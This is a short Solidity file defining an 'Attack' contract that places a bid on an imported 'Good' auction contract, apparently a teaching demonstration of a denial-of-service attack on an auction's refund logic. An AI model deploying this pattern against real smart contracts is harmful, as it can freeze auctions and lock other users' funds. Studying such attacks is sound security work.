//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "./Good.sol";
contract Attack{

    //Instance of good contract
    Good good;

    constructor(address _goodContractAddress){
        good = Good(_goodContractAddress);
    }

    function attack() public payable{

        //Setting current Auction Price
        good.setCurrentAuctionPrice{value: msg.value}();


    }






}